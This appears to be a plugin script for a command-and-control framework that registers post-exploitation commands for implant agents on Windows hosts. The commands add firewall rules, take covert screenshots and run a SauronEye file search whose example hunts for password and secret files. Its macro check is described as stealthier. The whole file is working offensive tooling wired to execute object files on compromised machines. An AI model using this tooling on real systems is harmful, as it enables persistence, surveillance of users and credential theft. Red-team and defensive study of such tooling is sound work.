var metadata = {
    name: "PostEx-BOF",
    description: "BOFs for post exploitation"
};

/// COMMANDS

var _cmd_fw_add = ax.create_command("add", "Add a new inbound or outbound firewall rule using COM", "firewallrule add 80 RuleName in -g Group1 -d TestRule");
_cmd_fw_add.addArgString("port", true);
_cmd_fw_add.addArgString("rulename", true);
_cmd_fw_add.addArgString("direction", "", "in");
_cmd_fw_add.addArgFlagString("-g", "rulegroup", "", "");
_cmd_fw_add.addArgFlagString("-d", "description", "", "");
_cmd_fw_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let direction   = parsed_json["direction"];
    let port        = parsed_json["port"];
    let rulename    = parsed_json["rulename"];
    let rulegroup   = parsed_json["rulegroup"];
    let description = parsed_json["description"];

    let bof_params = ax.bof_pack("cstr,wstr,wstr,wstr,wstr", [direction, port, rulename, rulegroup, description]);
    let bof_path = ax.script_dir() + "_bin/addfirewallrule." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Add firewall rule (BOF)");
});
var cmd_fw = ax.create_command("firewallrule", "Managing firewall rules");
cmd_fw.addSubCommands([_cmd_fw_add]);







var cmd_screenshot = ax.create_command("screenshot_bof", "Alternative screenshot capability that does not do fork n run by @codex_tf2", "screenshot -n screen1 -p 812");
cmd_screenshot.addArgFlagString("-n", "note", "Screenshot caption", "ScreenshotBOF");
cmd_screenshot.addArgFlagInt("-p", "pid", "PID of the application whose window screenshot will be taken. If 0, then a full-screen screenshot", 0);
cmd_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let note = parsed_json["note"];
    let pid  = parsed_json["pid"];

    let bof_params = ax.bof_pack("cstr,int", [note, pid]);
    let bof_path = ax.script_dir() + "_bin/Screenshot." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Screenshot BOF");
});



var cmd_sauroneye = ax.create_command("sauroneye", "Search directories for files containing specific keywords (SauronEye ported to BOF by @shashinma)", "sauroneye -d C:\\Users -f .txt,.docx -k pass*,secret*");
cmd_sauroneye.addArgFlagString("-d", "directories", "Comma-separated list of directories to search (default: C:\\)", "C:\\");
cmd_sauroneye.addArgFlagString("-f", "filetypes", "Comma-separated list of file extensions to search (default: .txt,.docx)", ".txt,.docx");
cmd_sauroneye.addArgFlagString("-k", "keywords", "Comma-separated list of keywords (supports wildcards * ). If not specified, matches all filenames", "");
cmd_sauroneye.addArgBool("-c", "Search file contents for keywords (supports wildcards * )");
cmd_sauroneye.addArgFlagInt("-m", "maxfilesize", "Max file size to search contents in, in kilobytes (default: 1024)", 1024);
cmd_sauroneye.addArgBool("-s",                      "Search in system directories (Windows and AppData)");
cmd_sauroneye.addArgFlagString("-b", "beforedate",  "Filter files last modified before this date (format: dd.MM.yyyy)", "");
cmd_sauroneye.addArgFlagString("-a", "afterdate",   "Filter files last modified after this date (format: dd.MM.yyyy)", "");
cmd_sauroneye.addArgBool("-v",                      "Check if Office files contain VBA macros using OOXML detection (no OLE, stealthier)");
cmd_sauroneye.addArgBool("-D", "Show file creation and modification dates in output (format: [C:dd.MM.yyyy M:dd.MM.yyyy])");
cmd_sauroneye.addArgFlagInt("-W", "wildcardattempts", "Maximum pattern matching attempts for wildcard search (default: 1000). Increase for complex patterns", 1000);
cmd_sauroneye.addArgFlagInt("-S", "wildcardsize", "Maximum search area in KB for large files when using wildcards (default: 200KB). Increase to search more", 200);
cmd_sauroneye.addArgFlagInt("-B", "wildcardbacktrack", "Maximum backtracking operations for wildcard matching (default: 1000). Increase for complex patterns", 1000);
cmd_sauroneye.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let directories = parsed_json["directories"];
    let filetypes = parsed_json["filetypes"];
    let keywords = parsed_json["keywords"];
    let search_contents = (parsed_json["-c"]) ? 1 : 0;
    let max_filesize = parsed_json["maxfilesize"];
    let system_dirs = (parsed_json["-s"]) ? 1 : 0;
    let before_date = parsed_json["beforedate"];
    let after_date = parsed_json["afterdate"];
    let check_macro = (parsed_json["-v"]) ? 1 : 0;
    let show_date = (parsed_json["-D"]) ? 1 : 0;
    let wildcard_attempts = parsed_json["wildcardattempts"];
    let wildcard_size = parsed_json["wildcardsize"];
    let wildcard_backtrack = parsed_json["wildcardbacktrack"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int,cstr,cstr,int,int,int,int,int", [cmdline, directories, filetypes, keywords, search_contents, max_filesize, system_dirs, before_date, after_date, check_macro, show_date, wildcard_attempts, wildcard_size, wildcard_backtrack]);
    let bof_path = ax.script_dir() + "_bin/sauroneye." + ax.arch(id) + ".o";

    let cmd = "execute bof";
    if (ax.agent_info(id, "type") == "kharon") { cmd = "exec-bof"; }

    ax.execute_alias(id, cmdline, `${cmd} ${bof_path} ${bof_params}`, "Task: SauronEye file search");
});


var b_group_test = ax.create_commands_group("PostEx-BOF", [cmd_fw, cmd_screenshot, cmd_sauroneye]);
ax.register_commands_group(b_group_test, ["beacon", "gopher"], ["windows"], []);

/// MENU

let screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot_bof")) });
menu.add_session_access(screen_access_action, ["beacon"]);
let g_screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot")) });
menu.add_session_access(g_screen_access_action, ["gopher"]);
